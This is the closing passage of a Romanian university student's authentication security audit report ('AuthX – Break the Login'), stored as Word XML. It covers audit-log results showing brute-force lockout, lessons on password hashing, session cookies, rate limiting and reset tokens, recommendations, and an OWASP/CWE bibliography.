        <w:t>Exemplu output (dupa rularea poc.py v2):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id | email                     | action        | timestamp           | ip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───┼───────────────────────────┼───────────────┼─────────────────────┼────────────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1 | bruteforce@authx.local    | FAILED_LOGIN  | 2026-04-30 12:43:38 | 127.0.0.1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2 | bruteforce@authx.local    | FAILED_LOGIN  | 2026-04-30 12:43:38 | 127.0.0.1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3 | bruteforce@authx.local    | FAILED_LOGIN  | 2026-04-30 12:43:38 | 127.0.0.1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4 | bruteforce@authx.local    | FAILED_LOGIN  | 2026-04-30 12:43:38 | 127.0.0.1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5 | bruteforce@authx.local    | FAILED_LOGIN  | 2026-04-30 12:43:38 | 127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Interpretare: 5 tentative esuate consecutiv de la 127.0.0.1 impotriva</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>aceluiasi cont → sistemul detecteaza atacul si blocheaza contul.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>9.4 Imbunatatiri posibile ale auditului (pentru productie)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Centralizarea log-urilor: exportarea in sisteme SIEM (Splunk, ELK Stack)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pentru corelarea evenimentelor de securitate la nivel de organizatie.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2. Alertare in timp real: notificari prin email/Slack cand un cont este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blocat sau cand se detecteaza &gt;N tentative de la acelasi IP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>3. IP-level rate limiting: blocarea IP-urilor care genereaza mai mult de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100 cereri pe minut, indiferent de contul tinta.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>4. Retentie log-uri: pastrarea audit log-urilor pentru minim 1 an conform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cerintelor GDPR si bunelor practici de securitate.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>5. Log-uri de sesiune: inregistrarea tuturor actiunilor efectuate in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contextul unei sesiuni (nu doar login/logout), pentru investigatii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post-incident.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F397D"/>
        </w:rPr>
        <w:t>10. CONCLUZII</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>10.1 Sumar executiv</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Proiectul AuthX a demonstrat in mod practic cum un mecanism de autentificare</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>implementat neglijent poate fi compromis total in cateva secunde de un atacator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cu cunostinte medii. Cele 6 vulnerabilitati identificate si demonstrate acopera</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>o gama completa de amenintari reale, toate mapate pe standardul OWASP Top 10.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Versiunea v1 (main.py) este un exemplu clasic de ce „security by obscurity"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>este o strategie esec: chiar daca codul nu este public, tehnicile de atac</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sunt bine cunoscute si automatizabile.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Versiunea v2 (main_secure.py) demonstreaza ca implementarea corecta nu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>presupune neaparat complexitate suplimentara, ci alegeri corecte din start:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- bcrypt in loc de MD5: 5 linii de cod in plus, securitate radical mai buna.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- secrets.token_urlsafe() in loc de Base64(email): 1 linie diferita.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- HttpOnly + SameSite pe cookie: 2 parametri in plus la set_cookie().</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Mesaj unic la eroare: mutarea raspunsului diferentiat intr-o singura constantă.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>10.2 Lectii invatate</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Lectia 1 – Algoritmii criptografici conteaza:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>MD5 si SHA1 sunt algoritmi proiectati pentru viteza, nu pentru securitate.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pentru stocarea parolelor, standardul industriei este bcrypt, argon2 sau</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>scrypt – algoritmi intentionat lenti, cu parametrizare explicita a costului</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>computatioal. Nicio parola nu trebuie stocata in text clar sau cu hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>slab, indiferent de perceptia riscului de breach.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Lectia 2 – Nu da informatii in plus atacatorului:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Mesajele de eroare diferentiate (User inexistent vs Parola gresita) par</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>„user-friendly" dar sunt o vulnerabilitate serioasa. Un singur mesaj</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>generic pentru orice esec de autentificare nu afecteaza experienta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>utilizatorului legitim, dar blocheaza complet user enumeration.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Lectia 3 – Cookieurile de sesiune trebuie tratate ca date sensibile:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Un cookie de sesiune este echivalentul credentialelor utilizatorului.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Atributele HttpOnly, Secure si SameSite=Strict nu sunt optionale –</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sunt cerinte minime de securitate. Valoarea cookie-ului trebuie sa fie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>un token opac generat criptografic, nu date user-identifiable.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Lectia 4 – Rate limiting nu este optional:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Orice endpoint de autentificare fara rate limiting este o usa deschisa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>pentru atacuri de brute force. Chiar si o politica simpla de 5 incercari</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>urmata de blocare temporara reduce dramatic suprafata de atac.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Lectia 5 – Token-urile de reset sunt credentiale temporare:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Un token de resetare parola ofera acelasi nivel de acces ca si parola.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Prin urmare, trebuie tratat cu aceleasi masuri de precautie: generat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>criptografic, cu expirare scurta si invalidat imediat dupa utilizare.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Lectia 6 – Security testing trebuie facut sistematic:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Fiecare functionalitate de autentificare trebuie testata explicit pentru</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>toate tipurile de atac. Un PoC automat (poc.py) care poate fi rulat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>atat impotriva versiunii vulnerabile cat si a celei securizate ofera</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dovezi concrete ca fix-urile functioneaza efectiv.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Lectia 7 – Auditabilitate de la inceput:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Logarea tentativelor esuate nu este o functionalitate nice-to-have –</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>este esentiala pentru detectarea atacurilor in desfasurare si pentru</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>investigatiile post-incident. Fara log-uri, un breach poate trece</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>neobservat saptamani sau luni.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>10.3 Recomandari pentru versiunile viitoare</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Multi-Factor Authentication (MFA): adaugarea unui al doilea factor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(TOTP/Google Authenticator sau SMS OTP) elimina riscul de cont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compromis chiar si in cazul unei parole furate.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2. CAPTCHA dupa N incercari esuate: inainte de blocarea completa,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un CAPTCHA detecteaza traficul automatizat fara a degrada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experienta utilizatorilor legitimi care uita parola.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>3. Refresh tokens + access tokens (JWT): pentru aplicatii mai complexe,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separarea token-ului de sesiune in access token (viata scurta, 15min)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si refresh token (viata lunga, stocat securizat) ofera control fin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asupra sesiunilor.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>4. HTTPS obligatoriu: in productie, aplicatia trebuie servita exclusiv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prin HTTPS, iar atributul Secure al cookie-ului trebuie activat.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>5. Content Security Policy (CSP): headere HTTP pentru prevenirea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executiei de scripturi neautorizate, reducand suprafata de atac XSS.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>6. Validare email la inregistrare: trimiterea unui email de confirmare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previne inregistrarea cu emailuri false si asigura ca utilizatorul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controleaza adresa de email declarata.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>10.4 Bibliografie</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[1] OWASP Top 10 2021 – https://owasp.org/Top10/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[2] OWASP Authentication Cheat Sheet –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https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[3] OWASP Session Management Cheat Sheet –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https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[4] OWASP Password Storage Cheat Sheet –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https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[5] OWASP Forgot Password Cheat Sheet –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https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[6] NIST SP 800-63B – Digital Identity Guidelines</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[7] FastAPI Documentation – https://fastapi.tiangolo.com/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[8] bcrypt Python library – https://pypi.org/project/bcrypt/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[9] Python secrets module – https://docs.python.org/3/library/secrets.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[10] CWE-521 Weak Password Requirements – https://cwe.mitre.org/data/definitions/521.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[11] CWE-916 Use of Password Hash With Insufficient Computational Effort –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https://cwe.mitre.org/data/definitions/916.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[12] CWE-307 Improper Restriction of Excessive Authentication Attempts –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https://cwe.mitre.org/data/definitions/307.html</w:t>
      </w:r>
    </w:p>
    <w:p/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        SFARSIT RAPORT – AuthX Security Audit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             Proiect #2 – Break the Login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        Facultatea de Matematica si Informatica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 xml:space="preserve">                         Universitatea din Bucuresti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